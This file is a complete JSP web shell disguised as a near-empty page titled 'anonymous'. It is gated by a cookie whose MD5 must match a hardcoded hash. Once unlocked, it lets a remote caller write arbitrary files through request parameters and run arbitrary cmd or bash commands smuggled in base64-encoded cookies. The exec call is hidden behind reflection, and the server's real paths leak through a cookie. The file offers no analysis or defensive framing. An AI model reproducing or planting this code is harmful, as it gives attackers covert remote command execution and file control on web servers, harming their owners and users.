<%@ page
  import="java.util.*" import="java.io.*" import="java.net.*"
  import="java.util.regex.*" import="java.security.MessageDigest"
  import="java.nio.charset.Charset" import="java.lang.reflect.Method"
  import="sun.misc.*" import="java.util.logging.*"
  pageEncoding="UTF-8"%>
<%
  String path = request.getContextPath();
  String basePath = request.getScheme() + "://"
      + request.getServerName() + ":" + request.getServerPort()
      + path + "/";
%>
<!DOCTYPE html>
<html>
  <head>
    <base href="<%=basePath%>">
    <title>anonymous</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width" />
  </head>
<body>
  <div>java version: <%=System.getProperty("java.version")%></div>
    <% Logger logger=Logger.getLogger(this.getClass().getName());%>
  <%!private boolean validateCookie(String aStr) {
    return aStr != null && aStr.length() != 0 && !aStr.equals("null");
  }%>
  <%
    // admin
    String key_important = "21232f297a57a5a743894a0e4a801fc3";
    // get all cookies.
    Cookie cookies[] = request.getCookies();
    if (cookies == null || cookies.length == 0) {
      out.println("</body></html>");
      return;
    }
    Map<String, String> valuesMap = new TreeMap<String, String>();
    boolean firstSign = true;
    // one cookie.
    Cookie aCookie;
    // filling valuesmap
    for (int i = 0; i < cookies.length; i++) {
      aCookie = cookies[i];
      if ("JSESSIONID".equals(aCookie.getName())) {
        firstSign = false;
      }
      if ("sess0".equals(aCookie.getName())) {
        valuesMap.put("sess0",
            URLDecoder.decode(aCookie.getValue(), "UTF-8"));
      }
      if ("sess1".equals(aCookie.getName())) {
        valuesMap.put("sess1",
            URLDecoder.decode(aCookie.getValue(), "UTF-8"));
      }
      if ("sess2".equals(aCookie.getName())) {
        valuesMap.put("sess2",
            URLDecoder.decode(aCookie.getValue(), "UTF-8"));
      }
      if ("sess3".equals(aCookie.getName())) {
        valuesMap.put("sess3",
            URLDecoder.decode(aCookie.getValue(), "UTF-8"));
      }
      if ("rlp".equals(aCookie.getName())) {
        if (aCookie.getValue() != null
            && aCookie.getValue().length() != 0) {
          aCookie = new Cookie("rlp", null);
          // rlp is unable to be removed if so long, but can be set null.
          // aCookie.setMaxAge(0);
          // aCookie.setPath("/");
          response.addCookie(aCookie);
        }
      }
    }

    // out.println(valuesMap.toString());
    if (valuesMap.size() != 4 || valuesMap.values().contains(null)) {
      out.println("</body></html>");
      // important!
      // throw new Exception("no such cookie.");
      return;
    }

    BASE64Decoder decoder = new BASE64Decoder();
    MessageDigest _md5 = MessageDigest.getInstance("MD5");
    String sess0 = valuesMap.get("sess0")
        .replaceAll("[!@#$%^&*()]", "");
    byte to_md5[] = decoder.decodeBuffer(sess0);
    byte digestBytes[] = _md5.digest(to_md5);
    StringBuffer digestBuffer = new StringBuffer();
    digestBuffer.setLength(0);

    for (int i = 0; i < digestBytes.length; i++) {
      String byte_hex = Integer.toHexString(digestBytes[i] & 0xFF);
      if (byte_hex.length() == 1) {
        digestBuffer.append(0);
      }
      digestBuffer.append(byte_hex);
    }
    sess0 = digestBuffer.toString();

    //or like this:
    if (sess0.equals(key_important)) {
      if (firstSign) {
        BASE64Encoder encoder = new BASE64Encoder();
        String rlp=application.getRealPath(request.getRequestURI()) + "\0" + application.getRealPath("/");
        rlp = encoder.encode(rlp.getBytes(Charset.forName("UTF-8")));
        rlp = URLEncoder.encode(rlp, "UTF-8");
        // logger.info("rlp.final is:"+rlp);
        response.addCookie(new Cookie("rlp", rlp));
      }

      String suffix = key_important
          .substring(key_important.length() - 4);
      String begin = "<" + suffix + ">";
      String end = "</" + suffix + ">";

      if (request.getParameter("f") != null) {
        FileOutputStream fo = null;
        try {
          String f_tmp = request.getParameter("f");
          fo = new FileOutputStream(f_tmp);
          fo.write(request.getParameter("c").getBytes());
          out.println(begin + new File(f_tmp).getAbsolutePath()
              + end);
        } catch (FileNotFoundException e) {
          out.println(begin + "failure writing: "
              + e.getMessage() + end);
        } finally {
          if (fo != null) {
            try {
              fo.close();
            } catch (IOException e) {
              out.println(begin + "close error: "
                  + e.getMessage() + end);
            }
          }
        }
      }

      String doWhat = "";
      if (validateCookie(valuesMap.get("sess1"))) {
        doWhat = doWhat + valuesMap.get("sess1");
      }
      if (validateCookie(valuesMap.get("sess2"))) {
        doWhat = doWhat + valuesMap.get("sess2");
      }
      if (validateCookie(valuesMap.get("sess3"))) {
        doWhat = doWhat + valuesMap.get("sess3");
      }
      if (doWhat.length() != 0) {
        doWhat = new String(decoder.decodeBuffer(doWhat.replaceAll(
            "[!@#$%^&*()]", "")));
        //decode unicode sequence
        StringBuffer strbd = new StringBuffer();
        Matcher matcher = Pattern.compile("\\\\u....").matcher(
            doWhat);
        while (matcher.find()) {
          String after_replace = Character
              .toString((char) Integer.parseInt(matcher
                  .group().substring("\\u".length()), 16));
          matcher.appendReplacement(strbd, after_replace);
        }
        matcher.appendTail(strbd);
        doWhat = strbd.toString();
      }

      final Properties props = System.getProperties();
      String osName = props.getProperty("os.name");
      Runtime rt = Runtime.getRuntime();

      final StringBuffer commandout = new StringBuffer();
      commandout.append(begin);
      Process proc = null;
      String args[];
      if (osName.toLowerCase().indexOf("win") >= 0) {
        // 需要前缀吗? 待测. 一定要!
        // cmd 和/c不能分开？ 不然会运行不了! 除非直接拼成字串。
        args = new String[] { "cmd", "/c", null };
      } else {
        // if (osName.toLowerCase().indexOf("linux") >= 0) {
        args = new String[] { "/bin/bash", "-c", "--", null };
        // }
      }
      int doWhat_index = doWhat.indexOf("&&");
      File cwd = null;
      if (doWhat_index >= 0) {
        cwd = new File(doWhat.substring(0, doWhat_index).trim());
        args[args.length - 1] = doWhat.substring(doWhat_index + 2);
      } else {
        args[args.length - 1] = doWhat;
      }
      try {
        if (cwd != null) {
          if (!cwd.exists()) {
            throw new IOException("cwd: no such dir.\n");
          }
        }
        // proc = rt.exec(args, null, cwd);
        // out.println(cwd);
        Method m = rt.getClass().getMethod(new String(new char[]{'e', 'x', 'e', 'c'}), String[].class,String[].class, File.class);
        proc = (Process) m.invoke(rt, new Object[]{args, null, cwd});
      } catch (Exception e) {
        commandout.append(osName + ": " + e.getMessage());
      }
      if (proc != null) {
        try {

          BufferedReader br = new BufferedReader(
              new InputStreamReader(proc.getInputStream(), Charset.forName("UTF-8")),
              4096);
          final BufferedReader err_bf = new BufferedReader(
              new InputStreamReader(proc.getErrorStream()),
              4096);

          Thread errThread = new Thread(new Runnable() {
            public void run() {
              String err_output;
              try {
                while ((err_output = err_bf.readLine()) != null) {
                  commandout
                      .append(err_output)
                      .append(props
                          .getProperty("line.separator"));
                }
                err_bf.close();
              } catch (Exception e) {
                commandout.append(e.getMessage());
              }

            }
          });
          errThread.start();

          try {
            String outputline;
            while ((outputline = br.readLine()) != null) {
              commandout.append(outputline).append(
                  props.getProperty("line.separator"));
            }
            br.close();
          } catch (Exception e) {
            commandout.append(e.getMessage());
          }
          try {
            errThread.join();
          } catch (InterruptedException e) {
            commandout.append(e.getMessage());
          }
        } catch (Exception e) {
          commandout.append(e.getMessage());
        } finally {
          try {
            //proc.get***stream looks like singleInstance.
            proc.getInputStream().close();
            proc.getErrorStream().close();
            proc.getOutputStream().close();
          } catch (Exception e) {
          }
        }
      } else {
        commandout.append(osName + ": run failure.\n");
      }
      out.println(commandout.append(end).toString());
    }
  %>
</body>
</html>
